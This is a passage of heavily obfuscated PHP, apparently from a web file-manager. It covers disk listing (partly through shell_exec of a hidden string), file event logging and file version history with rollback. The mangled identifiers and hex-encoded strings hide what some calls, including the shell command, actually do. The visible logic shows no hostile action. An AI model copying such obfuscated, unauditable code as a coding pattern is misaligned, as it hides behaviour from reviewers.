= false; if ($§áê’€Å) { return $§áê’€Å; } $§áê’€Å = IO::init(self::defaultIO()); return $§áê’€Å; } public static function fileTypeList() { $ğèÑÆ =& $_SERVER[Ôó‡è­ƒ]; $ì×â½® = $GLOBALS[$ğèÑÆ[6]][$ğèÑÆ[1283]]; foreach ($ì×â½® as $ÏàÔ“ => $‡Ó£ã·) { $÷ë‘õÂ¹ = $ğèÑÆ[1284] . $ÏàÔ“; $¯°şé„® = LNG($÷ë‘õÂ¹); if ($÷ë‘õÂ¹ != $¯°şé„®) { $ì×â½®[$ÏàÔ“][$ğèÑÆ[32]] = $¯°şé„®; } } return $ì×â½®; } public static function diskList($³ªÎ²¨Ö = true) { $ıŒ¨ã½ë = $_SERVER[Ôó‡è­ƒ][1285]; if ($³ªÎ²¨Ö) { $‹ÂÚØÄ„ = Cache::get($ıŒ¨ã½ë); if (is_array($‹ÂÚØÄ„)) { return $‹ÂÚØÄ„; } } $‹ÂÚØÄ„ = self::diskListGet(); Cache::set($ıŒ¨ã½ë, $‹ÂÚØÄ„, 60); return $‹ÂÚØÄ„; } public static function diskListGet() { $â¢²¹£ =& $_SERVER[Ôó‡è­ƒ]; $İçÌä = array(); if ($GLOBALS[$â¢²¹£[6]][$â¢²¹£[1286]] == $â¢²¹£[1287]) { $¼×§×Ê¹ = $â¢²¹£[1288]; for ($“¶µğ÷” = 0; $“¶µğ÷” < strlen($¼×§×Ê¹); $“¶µğ÷”++) { $…Ğ–â£ø = $¼×§×Ê¹[$“¶µğ÷”] . $â¢²¹£[1289]; if (file_exists($…Ğ–â£ø)) { $İçÌä[] = $…Ğ–â£ø; } } return $İçÌä; } if (!function_exists($â¢²¹£[99])) { $İçÌä[] = $â¢²¹£[833]; return $İçÌä; } $ª•ó×‚ø = explode($â¢²¹£[230], shell_exec($â¢²¹£[1290])); array_shift($ª•ó×‚ø); array_pop($ª•ó×‚ø); $«Ğï“¡’ = array($â¢²¹£[1291], $â¢²¹£[1292], $â¢²¹£[1293], $â¢²¹£[1294], $â¢²¹£[1295], $â¢²¹£[1296], $â¢²¹£[1297], $â¢²¹£[1298]); foreach ($ª•ó×‚ø as $‹‹ÔÀ») { $”ÁšÑĞ = preg_split($â¢²¹£[1299], $‹‹ÔÀ»); $…Ğ–â£ø = $”ÁšÑĞ[count($”ÁšÑĞ) - 1]; if (!strstr($”ÁšÑĞ[0], $â¢²¹£[1300]) || !$…Ğ–â£ø) { continue; } $©Ò½ ‡” = rtrim($…Ğ–â£ø, $â¢²¹£[8]) . $â¢²¹£[8]; if (in_array($©Ò½ ‡”, $«Ğï“¡’)) { continue; } $İçÌä[] = $©Ò½ ‡”; } return $İçÌä; } public static function isSameDisk($°£ƒ¡ Ğ, $€ëÕ—á–) { $’áâÜ«  =& $_SERVER[Ôó‡è­ƒ]; if ($GLOBALS[$’áâÜ« [6]][$’áâÜ« [1286]] == $’áâÜ« [1287]) { return strtolower(substr($°£ƒ¡ Ğ, 0, 1)) == strtolower(substr($€ëÕ—á–, 0, 1)); } $‘ã¡Ú­á = self::diskList(); $¥¬·ÈµŠ = !1; $”¾¯™Øú = !1; sort($‘ã¡Ú­á); $‘ã¡Ú­á = array_reverse($‘ã¡Ú­á); $°£ƒ¡ Ğ = rtrim($°£ƒ¡ Ğ, $’áâÜ« [8]) . $’áâÜ« [8]; $€ëÕ—á– = rtrim($€ëÕ—á–, $’áâÜ« [8]) . $’áâÜ« [8]; foreach ($‘ã¡Ú­á as $”¨®Ş’­) { $ºíô¡‡ = strlen($”¨®Ş’­); if (!$¥¬·ÈµŠ && substr($°£ƒ¡ Ğ, 0, $ºíô¡‡) == $”¨®Ş’­) { $¥¬·ÈµŠ = $”¨®Ş’­; } if (!$”¾¯™Øú && substr($€ëÕ—á–, 0, $ºíô¡‡) == $”¨®Ş’­) { $”¾¯™Øú = $”¨®Ş’­; } if ($¥¬·ÈµŠ && $”¾¯™Øú) { break; } } return $¥¬·ÈµŠ === $”¾¯™Øú; } public static function transferType($¢ô‰›¢æ, $ñåİº¿) { $ÄŞ¬èØ¤ =& $_SERVER[Ôó‡è­ƒ]; $ÏŸËâÚ = self::driverType($¢ô‰›¢æ); $ÙƒÜ‘¬ê = self::driverType($ñåİº¿); if ($ÏŸËâÚ[$ÄŞ¬èØ¤[33]] == $ÙƒÜ‘¬ê[$ÄŞ¬èØ¤[33]] && $ÏŸËâÚ[$ÄŞ¬èØ¤[1301]] == $ÙƒÜ‘¬ê[$ÄŞ¬èØ¤[1301]]) { return $ÄŞ¬èØ¤[1302]; } if ($ÏŸËâÚ[$ÄŞ¬èØ¤[33]] == $ÄŞ¬èØ¤[862] && $ÙƒÜ‘¬ê[$ÄŞ¬èØ¤[33]] == $ÄŞ¬èØ¤[107]) { return $ÄŞ¬èØ¤[1197]; } if ($ÏŸËâÚ[$ÄŞ¬èØ¤[33]] == $ÄŞ¬èØ¤[107] && $ÙƒÜ‘¬ê[$ÄŞ¬èØ¤[33]] == $ÄŞ¬èØ¤[862]) { return $ÄŞ¬èØ¤[108]; } return $ÄŞ¬èØ¤[1303]; } public static function driverType($ÌÂ¿Ñóë) { $ÖÜÛ’Ö =& $_SERVER[Ôó‡è­ƒ]; $»ãÉ’Øâ = str_replace($ÖÜÛ’Ö[1304], $ÖÜÛ’Ö[12], strtolower($ÌÂ¿Ñóë->getType())); if ($»ãÉ’Øâ == $ÖÜÛ’Ö[756] || $»ãÉ’Øâ == $ÖÜÛ’Ö[1305] || $»ãÉ’Øâ == $ÖÜÛ’Ö[1306]) { $ÌÂ¿Ñóë = self::defaultDriverInit(); } else { if ($»ãÉ’Øâ == $ÖÜÛ’Ö[1204] || $»ãÉ’Øâ == $ÖÜÛ’Ö[1307]) { $ÌÂ¿Ñóë = IO::init($ÌÂ¿Ñóë->pathParse[$ÖÜÛ’Ö[1151]]); } } $Şö¦²Å– = $ÌÂ¿Ñóë->path; $»ãÉ’Øâ = str_replace($ÖÜÛ’Ö[1304], $ÖÜÛ’Ö[12], strtolower($ÌÂ¿Ñóë->getType())); if ($»ãÉ’Øâ == $ÖÜÛ’Ö[107]) { return array($ÖÜÛ’Ö[33] => $ÖÜÛ’Ö[107], $ÖÜÛ’Ö[1301] => $ÖÜÛ’Ö[12], $ÖÜÛ’Ö[78] => $Şö¦²Å–); } return array($ÖÜÛ’Ö[33] => $ÖÜÛ’Ö[862], $ÖÜÛ’Ö[1301] => $ÌÂ¿Ñóë->pathDriver, $ÖÜÛ’Ö[78] => $Şö¦²Å–); } public static function pathDriverType($ØÆŠ±êñ) { return $ØÆŠ±êñ ? self::driverType(IO::init($ØÆŠ±êñ)) : !1; } } goto dÒ„¢ù‡Îã; EëàÊ‘Øç: class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\x75\x72\x63\145\x5f\x65\166\x65\156\x74"; protected $dataAuto = array(array("\143\162\x65\x61\x74\x65\124\151\x6d\145", "\164\x69\x6d\x65", "\x69\156\163\x65\162\x74", "\x66\165\x6e\x63\x74\x69\157\156"), array("\x64\145\163\x63", '', "\151\x6e\163\x65\x72\x74\x2c\x75\160\x64\141\164\x65\x2c\x73\x65\154\145\x63\x74", "\x6a\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($äÇø“ê, $›‘™ì¥³, $ùƒºğáÍ = '') { $ıÔØş‰Ö =& $_SERVER[Ôó‡è­ƒ]; if (!$this->eventSave) { return; } $‡êÚáºé = Model($ıÔØş‰Ö[1325])->sourceInfo($äÇø“ê); if (!$‡êÚáºé) { return !1; } if ($this->isCacheEvent($‡êÚáºé, $›‘™ì¥³)) { return; } if ($ùƒºğáÍ && is_string($ùƒºğáÍ)) { $ùƒºğáÍ = array($ıÔØş‰Ö[1861] => $ùƒºğáÍ); } $Ì¸ùŒÔ = array($ıÔØş‰Ö[414] => $äÇø“ê, $ıÔØş‰Ö[2037] => $‡êÚáºé[$ıÔØş‰Ö[494]], $ıÔØş‰Ö[2038] => $‡êÚáºé[$ıÔØş‰Ö[32]], $ıÔØş‰Ö[515] => !empty($‡êÚáºé[$ıÔØş‰Ö[515]]) ? $‡êÚáºé[$ıÔØş‰Ö[515]] : $ıÔØş‰Ö[12], $ıÔØş‰Ö[1646] => USER_ID, $ıÔØş‰Ö[419] => $›‘™ì¥³, $ıÔØş‰Ö[1648] => $ùƒºğáÍ); $this->addSystemLog($›‘™ì¥³, $Ì¸ùŒÔ); unset($Ì¸ùŒÔ[$ıÔØş‰Ö[2038]], $Ì¸ùŒÔ[$ıÔØş‰Ö[515]]); return $this->add($Ì¸ùŒÔ); } private function addSystemLog($àÌã¸¼”, $™ëƒ»˜½) { $®˜ëœ¦Ş =& $_SERVER[Ôó‡è­ƒ]; if ($àÌã¸¼” == $®˜ëœ¦Ş[2039]) { $àÌã¸¼” = $™ëƒ»˜½[$®˜ëœ¦Ş[447]][$®˜ëœ¦Ş[2040]]; } else { if (in_array($àÌã¸¼”, array($®˜ëœ¦Ş[1803], $®˜ëœ¦Ş[2041]))) { $àÌã¸¼” = $™ëƒ»˜½[$®˜ëœ¦Ş[447]][$®˜ëœ¦Ş[753]]; } } $å‘­«”ø = array_merge($™ëƒ»˜½, array($®˜ëœ¦Ş[2042] => $™ëƒ»˜½[$®˜ëœ¦Ş[399]], $®˜ëœ¦Ş[2043] => $™ëƒ»˜½[$®˜ëœ¦Ş[2043]])); Hook::trigger($®˜ëœ¦Ş[2044], $®˜ëœ¦Ş[2045] . $àÌã¸¼”, $™ëƒ»˜½); Model($®˜ëœ¦Ş[1767])->addLog($®˜ëœ¦Ş[2045] . $àÌã¸¼”, $å‘­«”ø); } private function isCacheEvent($˜ÛŒğ˜‚, $±™Í§Õ) { if ($˜ÛŒğ˜‚[$_SERVER[Ôó‡è­ƒ][408]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($¯“¬òÃ½, $‡‰€äµœ) { $£×Ì–Ï¥ =& $_SERVER[Ôó‡è­ƒ]; $÷¿ğ©ÏÇ = Model($£×Ì–Ï¥[1325])->sourceInfo($¯“¬òÃ½); $ˆ«Õ×¯« = array($£×Ì–Ï¥[2040] => $‡‰€äµœ, $£×Ì–Ï¥[32] => $÷¿ğ©ÏÇ[$£×Ì–Ï¥[32]]); return $this->addEvent($¯“¬òÃ½, $£×Ì–Ï¥[2039], $ˆ«Õ×¯«); } public function eventFileEdit($ç±ç×ä«) { $³Á¤”Ìİ =& $_SERVER[Ôó‡è­ƒ]; $şíõŞ·— = array($³Á¤”Ìİ[2046] => $_SERVER[$³Á¤”Ìİ[2047]], $³Á¤”Ìİ[2048] => strtolower(ACTION)); return $this->addEvent($ç±ç×ä«, $³Á¤”Ìİ[1793], $şíõŞ·—); } public function eventRecycle($œÑŞŸç, $´“££Ñ×) { return $this->addEvent($œÑŞŸç, $_SERVER[Ôó‡è­ƒ][2041], $´“££Ñ×); } public function eventRemove($÷Ö—×º) { $ÉÓ°¿è¬ =& $_SERVER[Ôó‡è­ƒ]; $–Åêì˜ = Model($ÉÓ°¿è¬[1325])->sourceInfo($÷Ö—×º); $ÂÑò€— = $–Åêì˜[$ÉÓ°¿è¬[32]]; return $this->addEvent($–Åêì˜[$ÉÓ°¿è¬[494]], $ÉÓ°¿è¬[1792], $ÂÑò€—); } public function eventShare($—µ³ì, $÷Í¼à¼) { return $this->addEvent($—µ³ì, $_SERVER[Ôó‡è­ƒ][1803], $÷Í¼à¼); } public function eventMove($×²“Šá’, $„šÏÈÓ, $õñå½Ò“) { $¸‚ÌçÚ¹ =& $_SERVER[Ôó‡è­ƒ]; $Ï…øŒ‰– = Model($¸‚ÌçÚ¹[1325]); $‡ÇšÑÚ = $Ï…øŒ‰–->sourceInfo($×²“Šá’); $Ô“ÄºŒæ = $Ï…øŒ‰–->sourceInfo($„šÏÈÓ); $ÍØñ±³Š = $Ï…øŒ‰–->sourceInfo($õñå½Ò“); $´–±ÙÃº = array($¸‚ÌçÚ¹[1158] => $„šÏÈÓ, $¸‚ÌçÚ¹[2049] => $Ô“ÄºŒæ[$¸‚ÌçÚ¹[32]], $¸‚ÌçÚ¹[2028] => !empty($Ô“ÄºŒæ[$¸‚ÌçÚ¹[515]]) ? $Ô“ÄºŒæ[$¸‚ÌçÚ¹[515]] : $¸‚ÌçÚ¹[12], $¸‚ÌçÚ¹[1159] => $õñå½Ò“, $¸‚ÌçÚ¹[2050] => $ÍØñ±³Š[$¸‚ÌçÚ¹[32]], $¸‚ÌçÚ¹[2051] => !empty($ÍØñ±³Š[$¸‚ÌçÚ¹[515]]) ? $ÍØñ±³Š[$¸‚ÌçÚ¹[515]] : $¸‚ÌçÚ¹[12]); $this->addEvent($×²“Šá’, $¸‚ÌçÚ¹[550], $´–±ÙÃº); $‡ÇšÑÚ = $Ï…øŒ‰–->sourceInfo($×²“Šá’); $´–±ÙÃº = array($¸‚ÌçÚ¹[399] => $‡ÇšÑÚ[$¸‚ÌçÚ¹[399]], $¸‚ÌçÚ¹[32] => $‡ÇšÑÚ[$¸‚ÌçÚ¹[32]]); $this->addEvent($„šÏÈÓ, $¸‚ÌçÚ¹[2052], $´–±ÙÃº); } public function eventCopy($ëéı³Å) { $this->eventCreate($ëéı³Å, $_SERVER[Ôó‡è­ƒ][548]); } public function eventRename($Æ“–­Œû, $¥÷âÙæÒ, $¦Á°ì·) { $­ø…èüŠ =& $_SERVER[Ôó‡è­ƒ]; $“ó‰ÎÎ’ = array($­ø…èüŠ[1158] => $¥÷âÙæÒ, $­ø…èüŠ[1159] => $¦Á°ì·); return $this->addEvent($Æ“–­Œû, $­ø…èüŠ[1340], $“ó‰ÎÎ’); } public function eventAddComment($‹ôÇ»Ûñ, $ºÀ€Ñ”­) { return $this->addEvent($‹ôÇ»Ûñ, $_SERVER[Ôó‡è­ƒ][2053], $ºÀ€Ñ”­); } public function eventAddDesc($ä«…é»è, $Ø©ºß¿Ø) { return $this->addEvent($ä«…é»è, $_SERVER[Ôó‡è­ƒ][2054], $Ø©ºß¿Ø); } public function listBySource($É€’î¶­) { $È¿ ×°à =& $_SERVER[Ôó‡è­ƒ]; $¶Ø‰Ü…Á = Model($È¿ ×°à[1325])->sourceInfo($É€’î¶­); $èâ³¨Ù¸ = array($È¿ ×°à[414] => $É€’î¶­); if ($¶Ø‰Ü…Á[$È¿ ×°à[407]] == $È¿ ×°à[89]) { $Ò»Ç±»ı = Model($È¿ ×°à[1325])->listSearchChildren($É€’î¶­, 20000); $Ò»Ç±»ı[] = $É€’î¶­ . $È¿ ×°à[377]; $èâ³¨Ù¸ = array($È¿ ×°à[399] => array($È¿ ×°à[7], $Ò»Ç±»ı)); } $€Ì Š•‘ = $this->where($èâ³¨Ù¸)->order($È¿ ×°à[2055])->selectPage(); if ($€Ì Š•‘[$È¿ ×°à[365]][$È¿ ×°à[366]] == 0) { $€Ì Š•‘[$È¿ ×°à[365]][$È¿ ×°à[366]] = 1; $€Ì Š•‘[$È¿ ×°à[368]] = array(array($È¿ ×°à[414] => $É€’î¶­, $È¿ ×°à[2037] => $¶Ø‰Ü…Á[$È¿ ×°à[494]], $È¿ ×°à[1646] => $¶Ø‰Ü…Á[$È¿ ×°à[448]], $È¿ ×°à[419] => $È¿ ×°à[2056], $È¿ ×°à[420] => $¶Ø‰Ü…Á[$È¿ ×°à[197]], $È¿ ×°à[1648] => $È¿ ×°à[12])); } return $this->eventListParse($€Ì Š•‘, $É€’î¶­); } private function eventListParse($”¢ù”Ñ, $ı­òò˜ì) { $ßìÓÉ‹Ÿ =& $_SERVER[Ôó‡è­ƒ]; $Éüèêª® = $”¢ù”Ñ[$ßìÓÉ‹Ÿ[368]]; $é×ĞìŞº = array_to_keyvalue($Éüèêª®, $ßìÓÉ‹Ÿ[12], $ßìÓÉ‹Ÿ[399]); $¥¼ûñá‡ = array_to_keyvalue($Éüèêª®, $ßìÓÉ‹Ÿ[12], $ßìÓÉ‹Ÿ[2043]); foreach ($Éüèêª® as $¯œÀ§¼) { $ÄÁƒŒƒ = $¯œÀ§¼[$ßìÓÉ‹Ÿ[447]]; if ($¯œÀ§¼[$ßìÓÉ‹Ÿ[33]] == $ßìÓÉ‹Ÿ[550] && isset($ÄÁƒŒƒ[$ßìÓÉ‹Ÿ[1158]])) { $é×ĞìŞº[] = $ÄÁƒŒƒ[$ßìÓÉ‹Ÿ[1158]] . $ßìÓÉ‹Ÿ[12]; $é×ĞìŞº[] = $ÄÁƒŒƒ[$ßìÓÉ‹Ÿ[1159]] . $ßìÓÉ‹Ÿ[12]; } if ($¯œÀ§¼[$ßìÓÉ‹Ÿ[33]] == $ßìÓÉ‹Ÿ[2052] && isset($ÄÁƒŒƒ[$ßìÓÉ‹Ÿ[399]])) { $é×ĞìŞº[] = $ÄÁƒŒƒ[$ßìÓÉ‹Ÿ[399]] . $ßìÓÉ‹Ÿ[12]; } } $é×ĞìŞº = array_merge($é×ĞìŞº, $¥¼ûñá‡, array($ı­òò˜ì . $ßìÓÉ‹Ÿ[12])); $é×ĞìŞº = array_unique($é×ĞìŞº); $çÄ®ÇÜù = array_unique(array_to_keyvalue($Éüèêª®, $ßìÓÉ‹Ÿ[12], $ßìÓÉ‹Ÿ[1655])); $©Ù™¸—• = Model($ßìÓÉ‹Ÿ[537])->userListInfo($çÄ®ÇÜù); $üí¡Ú·è = Model($ßìÓÉ‹Ÿ[823])->sourceListInfo($é×ĞìŞº, !0); foreach ($Éüèêª® as &$¯œÀ§¼) { if ($¯œÀ§¼[$ßìÓÉ‹Ÿ[33]] == $ßìÓÉ‹Ÿ[550] && isset($¯œÀ§¼[$ßìÓÉ‹Ÿ[447]][$ßìÓÉ‹Ÿ[1158]])) { $¯œÀ§¼[$ßìÓÉ‹Ÿ[447]][$ßìÓÉ‹Ÿ[1158]] = $üí¡Ú·è[$¯œÀ§¼[$ßìÓÉ‹Ÿ[447]][$ßìÓÉ‹Ÿ[1158]]]; $¯œÀ§¼[$ßìÓÉ‹Ÿ[447]][$ßìÓÉ‹Ÿ[1159]] = $üí¡Ú·è[$¯œÀ§¼[$ßìÓÉ‹Ÿ[447]][$ßìÓÉ‹Ÿ[1159]]]; } if ($¯œÀ§¼[$ßìÓÉ‹Ÿ[33]] == $ßìÓÉ‹Ÿ[2052] && isset($¯œÀ§¼[$ßìÓÉ‹Ÿ[447]][$ßìÓÉ‹Ÿ[399]])) { $¯œÀ§¼[$ßìÓÉ‹Ÿ[447]][$ßìÓÉ‹Ÿ[399]] = $üí¡Ú·è[$¯œÀ§¼[$ßìÓÉ‹Ÿ[447]][$ßìÓÉ‹Ÿ[399]]]; } $¯œÀ§¼[$ßìÓÉ‹Ÿ[87]] = $üí¡Ú·è[$¯œÀ§¼[$ßìÓÉ‹Ÿ[399]]]; $¯œÀ§¼[$ßìÓÉ‹Ÿ[2057]] = $üí¡Ú·è[$¯œÀ§¼[$ßìÓÉ‹Ÿ[2043]]]; if ($¯œÀ§¼[$ßìÓÉ‹Ÿ[33]] == $ßìÓÉ‹Ÿ[1792]) { $¯œÀ§¼[$ßìÓÉ‹Ÿ[2057]] = $¯œÀ§¼[$ßìÓÉ‹Ÿ[87]]; $¯œÀ§¼[$ßìÓÉ‹Ÿ[2043]] = $¯œÀ§¼[$ßìÓÉ‹Ÿ[2057]][$ßìÓÉ‹Ÿ[399]]; $¯œÀ§¼[$ßìÓÉ‹Ÿ[87]] = !1; $¯œÀ§¼[$ßìÓÉ‹Ÿ[399]] = $ßìÓÉ‹Ÿ[12]; } $¯œÀ§¼[$ßìÓÉ‹Ÿ[1988]] = $©Ù™¸—•[$¯œÀ§¼[$ßìÓÉ‹Ÿ[1655]]]; } unset($¯œÀ§¼); $”¢ù”Ñ[$ßìÓÉ‹Ÿ[368]] = $Éüèêª®; return $”¢ù”Ñ; } public function removeBySource($–¼µ£¦) { $¥™¢¥ï¦ = array($_SERVER[Ôó‡è­ƒ][414] => $–¼µ£¦); $this->where($¥™¢¥ï¦)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\x75\x72\x63\145\137\150\151\163\x74\x6f\x72\171"; public function historyCount($¹÷„ø°š) { $âÀ¨û¼¶ =& $_SERVER[Ôó‡è­ƒ]; if (!$¹÷„ø°š) { return array(); } if (is_string($¹÷„ø°š) || is_int($¹÷„ø°š)) { $¹÷„ø°š = array($¹÷„ø°š); } $Ì¥€µŒ» = array($âÀ¨û¼¶[399], $âÀ¨û¼¶[1855] => $âÀ¨û¼¶[496]); $•ÀÇµÌÚ = array($âÀ¨û¼¶[399] => array($âÀ¨û¼¶[7], $¹÷„ø°š)); $éœóÚÌ = $this->field($Ì¥€µŒ»)->where($•ÀÇµÌÚ)->group($âÀ¨û¼¶[399])->select(); return array_to_keyvalue($éœóÚÌ, $âÀ¨û¼¶[399], $âÀ¨û¼¶[496]); } public function addHistory($‰¯³›íë, $ü‡Á²¶í = '') { $î¹Âë®æ =& $_SERVER[Ôó‡è­ƒ]; $°½äöò¤ = array($î¹Âë®æ[414] => $‰¯³›íë[$î¹Âë®æ[399]], $î¹Âë®æ[1646] => isset($‰¯³›íë[$î¹Âë®æ[450]]) ? $‰¯³›íë[$î¹Âë®æ[450]] : $‰¯³›íë[$î¹Âë®æ[448]], $î¹Âë®æ[464] => $‰¯³›íë[$î¹Âë®æ[463]], $î¹Âë®æ[578] => $‰¯³›íë[$î¹Âë®æ[80]], $î¹Âë®æ[2058] => $ü‡Á²¶í); $©ëìÛÕá = $GLOBALS[$î¹Âë®æ[6]][$î¹Âë®æ[90]][$î¹Âë®æ[1207]]; if ($©ëìÛÕá > 1) { $this->historyAutoClear($°½äöò¤[$î¹Âë®æ[399]]); $this->add($°½äöò¤); } Hook::trigger($î¹Âë®æ[2059], $°½äöò¤); Model($î¹Âë®æ[2060])->eventFileEdit($‰¯³›íë[$î¹Âë®æ[399]]); } private function historyAutoClear($ÂÆˆÁŠ®) { $ˆÅ‡¾¸ =& $_SERVER[Ôó‡è­ƒ]; $½øäù = Model($ˆÅ‡¾¸[768])->get($ˆÅ‡¾¸[1229]); $—“áÃÇõ = $GLOBALS[$ˆÅ‡¾¸[6]][$ˆÅ‡¾¸[90]][$ˆÅ‡¾¸[1207]]; $êˆÂ—¾ = $½øäù == $ˆÅ‡¾¸[1230] ? 5 : $—“áÃÇõ; if ($—“áÃÇõ <= 1) { $êˆÂ—¾ = 1; } if ($êˆÂ—¾ >= 500) { return; } $üøº¨á = array($ˆÅ‡¾¸[414] => $ÂÆˆÁŠ®); $ƒ‚Éà¥Â = $this->field($ˆÅ‡¾¸[2061])->where($üøº¨á)->order($ˆÅ‡¾¸[2055])->select(); if (!$ƒ‚Éà¥Â || $êˆÂ—¾ >= count($ƒ‚Éà¥Â)) { return; } $€«Ó­Ø¾ = array_to_keyvalue($ƒ‚Éà¥Â, $ˆÅ‡¾¸[12], $ˆÅ‡¾¸[396]); $€«Ó­Ø¾ = array_slice($€«Ó­Ø¾, $êˆÂ—¾); $ÆÃÃÌì— = array_to_keyvalue($ƒ‚Éà¥Â, $ˆÅ‡¾¸[12], $ˆÅ‡¾¸[463]); $ÆÃÃÌì— = array_slice($ÆÃÃÌì—, $êˆÂ—¾); if (!$€«Ó­Ø¾ || !$ÆÃÃÌì—) { return; } $üøº¨á = array($ˆÅ‡¾¸[416] => array($ˆÅ‡¾¸[7], $€«Ó­Ø¾)); $this->where($üøº¨á)->delete(); Model($ˆÅ‡¾¸[466])->remove($ÆÃÃÌì—); } public function listData($•òá†úà) { $Ñ›¦äƒ =& $_SERVER[Ôó‡è­ƒ]; $‘®Œ¹Ìø = array($Ñ›¦äƒ[414] => $•òá†úà); $Õ„Ùñ°° = $Ñ›¦äƒ[2062]; $”–şÍÉ = $this->field($Õ„Ùñ°°)->where($‘®Œ¹Ìø)->order($Ñ›¦äƒ[2055])->selectPage(); $this->_listAppendUser($”–şÍÉ[$Ñ›¦äƒ[368]]); $Š×Ñ½ÍŒ = Model($Ñ›¦äƒ[768])->get($Ñ›¦äƒ[1229]); $§‚Áƒî = 5; if ($Š×Ñ½ÍŒ == $Ñ›¦äƒ[1230]) { $”–şÍÉ[$Ñ›¦äƒ[368]] = array_slice($”–şÍÉ[$Ñ›¦äƒ[368]], 0, $§‚Áƒî); $”–şÍÉ[$Ñ›¦äƒ[365]] = array($Ñ›¦äƒ[2063] => 1, $Ñ›¦äƒ[2064] => 20, $Ñ›¦äƒ[2065] => 1, $Ñ›¦äƒ[2066] => count($”–şÍÉ[$Ñ›¦äƒ[368]])); } return $”–şÍÉ; } protected function _listAppendUser(&$›É«îƒ) { $ÔàÉª¡û =& $_SERVER[Ôó‡è­ƒ]; $öØ¨£åİ = array_to_keyvalue($›É«îƒ, $ÔàÉª¡û[12], $ÔàÉª¡û[1655]); $ó–×øó = Model($ÔàÉª¡û[537])->userListInfo($öØ¨£åİ); foreach ($›É«îƒ as &$ç´ğÏÂó) { $ÁÑ­öé× = $ç´ğÏÂó[$ÔàÉª¡û[1655]]; $ç´ğÏÂó[$ÔàÉª¡û[448]] = $ó–×øó[$ÁÑ­öé×] ? $ó–×øó[$ÁÑ­öé×] : !1; } unset($ç´ğÏÂó); } public function fileInfo($»çªóñæ) { $üøú¦©ù =& $_SERVER[Ôó‡è­ƒ]; $ìÊ‘õ¦ = $this->tablePrefix; $œèòÍ = "{$ìÊ‘õ¦}\x69\x6f\x5f\x66\x69\154\145\40\146\151\154\145\163\40\157\x6e\x20\x66\x69\154\x65\x73\56\146\151\154\x65\111\x44\40\x3d\x20\x68\x69\x73\164\157\x72\x79\x2e\146\151\154\145\x49\x44"; return $this->alias($üøú¦©ù[2067])->where(array($üøú¦©ù[416] => $»çªóñæ))->join($œèòÍ, $üøú¦©ù[2068])->find(); } public function removeItem($ø¶Õİ±Ø) { $£ÉĞ„õ„ =& $_SERVER[Ôó‡è­ƒ]; $ñ˜³Ğò† = array($£ÉĞ„õ„[416] => $ø¶Õİ±Ø); $Ùí¾¤ƒ¯ = $this->where($ñ˜³Ğò†)->find(); if ($Ùí¾¤ƒ¯) { $ãÄâ©¯Û = $this->where($ñ˜³Ğò†)->delete(); Model($£ÉĞ„õ„[466])->remove($Ùí¾¤ƒ¯[$£ÉĞ„õ„[463]]); return $ãÄâ©¯Û; } return !1; } public function removeBySource($¼Ñú‘Õ) { $ŠÄã—º =& $_SERVER[Ôó‡è­ƒ]; if (!$¼Ñú‘Õ) { return !1; } if (!is_array($¼Ñú‘Õ)) { $¼Ñú‘Õ = array($¼Ñú‘Õ); } $ä“å”Ãş = array($ŠÄã—º[414] => array($ŠÄã—º[7], $¼Ñú‘Õ)); $«×’Á  = $this->field($ŠÄã—º[464])->where($ä“å”Ãş)->select(); if ($«×’Á ) { $this->where($ä“å”Ãş)->delete(); $‹¬ÖÃ¸ò = array_to_keyvalue($«×’Á , $ŠÄã—º[12], $ŠÄã—º[463]); Model($ŠÄã—º[466])->remove($‹¬ÖÃ¸ò); } return !0; } public function setDetail($ğ¢ÒŞÈô, $ÅÜı«æ) { $éØ÷ï›¦ =& $_SERVER[Ôó‡è­ƒ]; return $this->where(array($éØ÷ï›¦[416] => $ğ¢ÒŞÈô))->save(array($éØ÷ï›¦[2058] => $ÅÜı«æ)); } public function rollbackToItem($ßŞÁ¤á, $Ìı¥§±„) { $¦ˆ« =& $_SERVER[Ôó‡è­ƒ]; $â¼ÔÅ› = Model($¦ˆ«[823])->sourceInfo($ßŞÁ¤á); $this->addHistory($â¼ÔÅ›, LNG($¦ˆ«[2069])); $”»µÂ¥û = $this->find($Ìı¥§±„); $ùŒİÔØá = array($¦ˆ«[463] => $”»µÂ¥û[$¦ˆ«[463]], $¦ˆ«[80] => $”»µÂ¥û[$¦ˆ«[80]], $¦ˆ«[86] => time(), $¦ˆ«[450] => USER_ID); Model($¦ˆ«[823])->where(array($¦ˆ«[399] => $ßŞÁ¤á))->save($ùŒİÔØá); return $this->where(array($¦ˆ«[416] => $Ìı¥§±„))->delete(); } public function clearSame($ğßŠö‘²) { $ÀÊõ¡‰Œ =& $_SERVER[Ôó‡è­ƒ]; $Ê§¨ˆÈÁ = $this->listData($ğßŠö‘²); $ş¶îÊ™ = array_to_keyvalue_group($Ê§¨ˆÈÁ, $ÀÊõ¡‰Œ[463]); $¯áØİÚ = array(); $—½µ±âû = array(); foreach ($ş¶îÊ™ as $ÈÕÆ÷Ü) { if (!$ÈÕÆ÷Ü || count($ÈÕÆ÷Ü) <= 1) { continue; } foreach ($ÈÕÆ÷Ü as $¹™Ñ™Ï´) { $¯áØİÚ[] = $¹™Ñ™Ï´[$ÀÊõ¡‰Œ[463]]; $—½µ±âû[] = $¹™Ñ™Ï´[$ÀÊõ¡‰Œ[396]]; } } if (!$—½µ±âû) { return; } $this->where(array($ÀÊõ¡‰Œ[396] => array($ÀÊõ¡‰Œ[7], $—½µ±âû)))->delete(); Model($ÀÊõ¡‰Œ[466])->remove($¯áØİÚ); } public function userSpace() { $ÏºŒÕó =& $_SERVER[Ôó‡è­ƒ]; $ìÅÕã¤ü = $this->tablePrefix; $Ä½Ÿëëé = array($ÏºŒÕó[1646] => USER_ID); $ŠÄĞÅ¸… = "{$ìÅÕã¤ü}\x69\157\137\x66\151\154\x65\40\x66\x69\x6c\x65\x73\40\x6f\x6e\40\x66\x69\154\x65\163\x2e\x66\151\154\145\111\104\40\75\x20\x68\151\163\x74\x6f\162\171\56\x66\x69\x6c\x65\111\x44"; return $this->alias($ÏºŒÕó[2067])->where($Ä½Ÿëëé)->join($ŠÄĞÅ¸…, $ÏºŒÕó[2068])->sum($ÏºŒÕó[80]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($å™¬ğÙ) { 